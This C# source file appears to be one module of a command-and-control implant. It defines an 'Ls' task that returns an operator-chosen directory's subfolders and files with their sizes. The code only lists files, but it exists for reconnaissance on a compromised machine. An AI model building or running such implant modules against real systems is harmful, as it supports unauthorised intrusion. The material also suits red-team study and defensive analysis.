using System.IO;
using System.Text;

using Implant.Models;

namespace Implant.Tasks.Execute
{
    class Ls : ImplantCommands
    {
        private string targetPath { get; set; } 
        public override string Name => "Ls";

        public override string Execute(ImplantTask task)
        {
            targetPath = task.Args;

            StringBuilder _out = new StringBuilder();

            if (targetPath is null || targetPath == ""){
                targetPath = Directory.GetCurrentDirectory();
            }

            var dirs = Directory.GetDirectories(targetPath);
            foreach(var dir in dirs){
                var dirData = new DirectoryInfo(dir);
                _out.AppendLine($"{dirData.Name}");
            }

            var files = Directory.GetFiles(targetPath);
            foreach (var file in files) { 
                var fileData = new FileInfo(file);
                _out.AppendLine($"{fileData.Name} {fileData.Length}");
            }

            return _out.ToString();
        }
    }
}
